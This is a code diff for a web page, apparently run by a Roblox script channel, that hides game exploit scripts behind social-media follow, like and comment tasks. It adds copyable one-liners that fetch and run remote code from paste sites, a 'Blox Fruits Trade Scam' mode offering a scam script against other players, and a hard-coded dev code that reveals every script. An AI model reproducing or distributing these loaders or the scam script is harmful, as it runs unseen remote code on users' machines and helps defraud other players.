@@ -89,6 +89,8 @@ body {
 .scripts {
   display: none;
   margin-top: 20px;
+  max-height: 350px;
+  overflow-y: auto;
 }
 
 .script-box {
@@ -96,25 +98,51 @@ body {
   border-radius: 12px;
   padding: 14px;
   margin-bottom: 12px;
+  display: flex;
+  flex-direction: column;
 }
 
 .script-title {
   font-weight: bold;
   margin-bottom: 8px;
+  color: #4fd1ff;
+}
+
+.script-preview {
+  background: #1e293b;
+  border-radius: 8px;
+  padding: 10px;
+  font-family: monospace;
+  font-size: 13px;
+  color: #cbd5e1;
+  white-space: pre-wrap;
+  word-break: break-word;
+  user-select: text;
+  margin-bottom: 8px;
+  height: 80px;
+  overflow-y: auto;
+  resize: vertical;
+  border: 1px solid #334155;
 }
 
 .copy {
-  width: 100%;
+  align-self: flex-start;
   border: none;
-  padding: 10px;
+  padding: 8px 14px;
   border-radius: 8px;
   background: #4fd1ff;
   color: #000;
   font-weight: bold;
   cursor: pointer;
+  user-select: none;
+  transition: background 0.3s;
 }
 
-/* Bottom button */
+.copy:hover {
+  background: #38bdf8;
+}
+
+/* Bottom buttons */
 .bottom-button {
   margin-top: 20px;
   background: #ff5722;
@@ -131,6 +159,25 @@ body {
 
 .bottom-button:hover {
   background: #e64a19;
+}
+
+/* Smaller button for dev feature */
+.dev-button {
+  margin-top: 10px;
+  background: #4a90e2;
+  padding: 10px;
+  font-weight: bold;
+  border-radius: 12px;
+  border: none;
+  cursor: pointer;
+  color: white;
+  font-size: 14px;
+  user-select: none;
+  transition: background 0.3s;
+}
+
+.dev-button:hover {
+  background: #357abd;
 }
 </style>
 </head>
@@ -152,6 +199,8 @@ body {
 
   </div>
 
+  <button class="dev-button" id="showAllBtn" onclick="showAllScripts()">Show All Scripts (Dev Feature)</button>
+
   <div class="progress">
     <div class="bar" id="bar"></div>
   </div>
@@ -162,17 +211,20 @@ body {
 
     <div class="script-box">
       <div class="script-title">Script 1</div>
-      <button class="copy" onclick="copy(`loadstring(game:HttpGet(&quot;https://dpaste.com/ELB5KB66F.txt&quot;, true))()`)">Copy</button>
+      <textarea class="script-preview" readonly>loadstring(game:HttpGet("https://dpaste.com/ELB5KB66F.txt", true))()</textarea>
+      <button class="copy" onclick="copyText(this.previousElementSibling)">Copy</button>
     </div>
 
     <div class="script-box">
       <div class="script-title">Script 2</div>
-      <button class="copy" onclick="copy(`loadstring(game:HttpGet(&quot;https://pastefy.app/qLQ25me5/raw&quot;))()`)">Copy</button>
+      <textarea class="script-preview" readonly>loadstring(game:HttpGet("https://pastefy.app/qLQ25me5/raw"))()</textarea>
+      <button class="copy" onclick="copyText(this.previousElementSibling)">Copy</button>
     </div>
 
     <div class="script-box">
       <div class="script-title">Script 3</div>
-      <button class="copy" onclick="copy(`loadstring(game:HttpGet(&quot;https://pastefy.app/cX73Mb9d/raw&quot;))()`)">Copy</button>
+      <textarea class="script-preview" readonly>loadstring(game:HttpGet("https://pastefy.app/cX73Mb9d/raw"))()</textarea>
+      <button class="copy" onclick="copyText(this.previousElementSibling)">Copy</button>
     </div>
 
   </div>
@@ -204,9 +256,12 @@ function update() {
   }
 }
 
-function copy(text) {
-  navigator.clipboard.writeText(text);
-  alert("Copied!");
+function copyText(textarea) {
+  textarea.select();
+  textarea.setSelectionRange(0, 99999); /* For mobile devices */
+  navigator.clipboard.writeText(textarea.value)
+    .then(() => alert("Copied!"))
+    .catch(() => alert("Failed to copy!"));
 }
 
 function resetProgress() {
@@ -216,40 +271,12 @@ function resetProgress() {
   document.getElementById("scripts").style.display = "none";
 }
 
-// Store the original HTML for the tasks and scripts so we can revert easily
-const originalTasksHTML = `
-  <button class="task tiktok" onclick="step(this,'https://www.tiktok.com/@void_scriptz?_r=1&_t=ZT-92Rd5Rtlw3K')">📌 Follow TikTok</button>
-  <button class="task youtube" onclick="step(this,'https://youtube.com/@xxxvoid_scriptzxxx?si=SCGX78XJf16UEyoq')">🔔 Subscribe YouTube</button>
-  <button class="task like" onclick="step(this,'https://youtu.be/Oc9vLLmABqs?si=_Ugl81A4zS3jDuSH')">👍 Like Video</button>
-  <button class="task comment" onclick="step(this,'https://youtu.be/Oc9vLLmABqs?si=_Ugl81A4zS3jDuSH')">💬 Comment on Video</button>
-  <button class="task watch" onclick="step(this,'https://youtu.be/Oc9vLLmABqs?si=_Ugl81A4zS3jDuSH')">▶️ Watch Video</button>
-`;
-
-const originalScriptsHTML = `
-    <div class="script-box">
-      <div class="script-title">Script 1</div>
-      <button class="copy" onclick="copy(\`loadstring(game:HttpGet(&quot;https://dpaste.com/ELB5KB66F.txt&quot;, true))()\`)">Copy</button>
-    </div>
-
-    <div class="script-box">
-      <div class="script-title">Script 2</div>
-      <button class="copy" onclick="copy(\`loadstring(game:HttpGet(&quot;https://pastefy.app/qLQ25me5/raw&quot;))()\`)">Copy</button>
-    </div>
-
-    <div class="script-box">
-      <div class="script-title">Script 3</div>
-      <button class="copy" onclick="copy(\`loadstring(game:HttpGet(&quot;https://pastefy.app/cX73Mb9d/raw&quot;))()\`)">Copy</button>
-    </div>
-`;
-
 function showTradeScam() {
   // Change title and subtitle
   document.getElementById("title").innerText = "⚠️ Blox Fruits Trade Scam";
   document.getElementById("subtitle").innerText = "Complete all steps to unlock";
 
-  // Replace tasks with the modified ones:
-  // TikTok stays same
-  // Replace YouTube video related buttons with the same link https://youtube.com/shorts/ycfxxkTQmTU?si=MlKbm2fgg7uHEx0M
+  // Replace tasks
   document.getElementById("tasks").innerHTML = `
     <button class="task tiktok" onclick="step(this,'https://www.tiktok.com/@void_scriptz?_r=1&_t=ZT-92Rd5Rtlw3K')">📌 Follow TikTok</button>
     <button class="task youtube" onclick="step(this,'https://youtube.com/shorts/ycfxxkTQmTU?si=MlKbm2fgg7uHEx0M')">🔔 Subscribe YouTube</button>
@@ -258,16 +285,96 @@ function showTradeScam() {
     <button class="task watch" onclick="step(this,'https://youtube.com/shorts/ycfxxkTQmTU?si=MlKbm2fgg7uHEx0M')">▶️ Watch Video</button>
   `;
 
-  // Replace scripts area with the new script only
+  // Replace scripts area with the new single trade scam script with preview and copy
   document.getElementById("scripts").innerHTML = `
     <div class="script-box">
       <div class="script-title">Trade Scam Script</div>
-      <button class="copy" onclick="copy('loadstring(game:HttpGet(\\'https://api.rubis.app/v2/scrap/fRNF9vgOh5toji9n/raw\\', true))()')">Copy</button>
+      <textarea class="script-preview" readonly>loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/yjYMVmWu8WkquVbg/raw", true))()</textarea>
+      <button class="copy" onclick="copyText(this.previousElementSibling)">Copy</button>
     </div>
   `;
 
-  // Reset progress
+  // Hide Dev Feature button on trade scam page
+  document.getElementById("showAllBtn").style.display = "none";
+
   resetProgress();
+}
+
+function showOriginal() {
+  // Reset title and subtitle
+  document.getElementById("title").innerText = "🔑 Unlock Dupe";
+  document.getElementById("subtitle").innerText = "Complete all steps to unlock";
+
+  // Restore original tasks
+  document.getElementById("tasks").innerHTML = `
+    <button class="task tiktok" onclick="step(this,'https://www.tiktok.com/@void_scriptz?_r=1&_t=ZT-92Rd5Rtlw3K')">📌 Follow TikTok</button>
+    <button class="task youtube" onclick="step(this,'https://youtube.com/@xxxvoid_scriptzxxx?si=SCGX78XJf16UEyoq')">🔔 Subscribe YouTube</button>
+    <button class="task like" onclick="step(this,'https://youtu.be/Oc9vLLmABqs?si=_Ugl81A4zS3jDuSH')">👍 Like Video</button>
+    <button class="task comment" onclick="step(this,'https://youtu.be/Oc9vLLmABqs?si=_Ugl81A4zS3jDuSH')">💬 Comment on Video</button>
+    <button class="task watch" onclick="step(this,'https://youtu.be/Oc9vLLmABqs?si=_Ugl81A4zS3jDuSH')">▶️ Watch Video</button>
+  `;
+
+  // Restore original scripts with previews and copy buttons
+  document.getElementById("scripts").innerHTML = `
+    <div class="script-box">
+      <div class="script-title">Script 1</div>
+      <textarea class="script-preview" readonly>loadstring(game:HttpGet("https://dpaste.com/ELB5KB66F.txt", true))()</textarea>
+      <button class="copy" onclick="copyText(this.previousElementSibling)">Copy</button>
+    </div>
+
+    <div class="script-box">
+      <div class="script-title">Script 2</div>
+      <textarea class="script-preview" readonly>loadstring(game:HttpGet("https://pastefy.app/qLQ25me5/raw"))()</textarea>
+      <button class="copy" onclick="copyText(this.previousElementSibling)">Copy</button>
+    </div>
+
+    <div class="script-box">
+      <div class="script-title">Script 3</div>
+      <textarea class="script-preview" readonly>loadstring(game:HttpGet("https://pastefy.app/cX73Mb9d/raw"))()</textarea>
+      <button class="copy" onclick="copyText(this.previousElementSibling)">Copy</button>
+    </div>
+  `;
+
+  // Show Dev Feature button on original page
+  document.getElementById("showAllBtn").style.display = "block";
+
+  resetProgress();
+}
+
+// Show all scripts when dev feature button clicked
+function showAllScripts() {
+  const code = prompt("Enter dev code to show all scripts:");
+  if (code === "NinjaBlender223") {
+    // Show all scripts combined in scripts area
+    document.getElementById("scripts").style.display = "block";
+    document.getElementById("scripts").innerHTML = `
+      <div class="script-box">
+        <div class="script-title">Script 1</div>
+        <textarea class="script-preview" readonly>loadstring(game:HttpGet("https://dpaste.com/ELB5KB66F.txt", true))()</textarea>
+        <button class="copy" onclick="copyText(this.previousElementSibling)">Copy</button>
+      </div>
+
+      <div class="script-box">
+        <div class="script-title">Script 2</div>
+        <textarea class="script-preview" readonly>loadstring(game:HttpGet("https://pastefy.app/qLQ25me5/raw"))()</textarea>
+        <button class="copy" onclick="copyText(this.previousElementSibling)">Copy</button>
+      </div>
+
+      <div class="script-box">
+        <div class="script-title">Script 3</div>
+        <textarea class="script-preview" readonly>loadstring(game:HttpGet("https://pastefy.app/cX73Mb9d/raw"))()</textarea>
+        <button class="copy" onclick="copyText(this.previousElementSibling)">Copy</button>
+      </div>
+
+      <div class="script-box">
+        <div class="script-title">Trade Scam Script</div>
+        <textarea class="script-preview" readonly>loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/yjYMVmWu8WkquVbg/raw", true))()</textarea>
+        <button class="copy" onclick="copyText(this.previousElementSibling)">Copy</button>
+      </div>
+    `;
+  } else {
+    alert("Incorrect code.");
+  }
 }
 
 </script>
